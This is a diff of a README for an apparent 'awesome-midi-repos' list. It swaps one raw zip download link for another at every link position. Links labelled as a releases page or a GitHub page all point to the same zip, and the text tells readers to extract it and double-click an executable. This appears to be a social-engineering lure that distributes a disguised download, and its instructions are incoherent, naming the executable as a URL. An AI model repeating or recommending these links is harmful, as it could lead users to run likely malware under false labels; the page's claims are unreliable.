@@ -1,6 +1,6 @@
 # 🎵 awesome-midi-repos - Discover and Enjoy MIDI Files 
 
-[![Download Now](https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip)
+[![Download Now](https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **awesome-midi-repos**! This is a carefully curated list of GitHub re
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip).
 
 Once there, you will find listings of all available versions. Choose the one that suits you best. The files will usually be in a compressed format, like ZIP. Download the file to your computer.
 
@@ -29,7 +29,7 @@ Before you download, here are some basic system requirements:
 ## 🚀 Running the Application
 
 1. Open the folder where you extracted the files.
-2. Look for the executable file. It may be named something like `https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip` or similar.
+2. Look for the executable file. It may be named something like `https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip` or similar.
 3. Double-click the file to run the application.
 
 ## 🎵 How to Use the Application
@@ -46,12 +46,12 @@ This project is licensed under the MIT License. Feel free to use and share the M
 
 ## 🤝 Contributing
 
-We welcome contributions! If you want to suggest new repositories to include or improve the project, please visit our [GitHub Page](https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip).
+We welcome contributions! If you want to suggest new repositories to include or improve the project, please visit our [GitHub Page](https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip).
 
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to check out the GitHub Issues section or reach out directly for help.
 
-For more details, make sure to visit this page to download: [Releases Page](https://raw.githubusercontent.com/NouilleOrque/awesome-midi-repos/main/beer/midi-repos-awesome-dreamily.zip). 
+For more details, make sure to visit this page to download: [Releases Page](https://github.com/NouilleOrque/awesome-midi-repos/raw/refs/heads/main/beer/awesome-repos-midi-v1.8.zip). 
 
 Thank you for trying out **awesome-midi-repos**! Enjoy exploring the world of MIDI files.
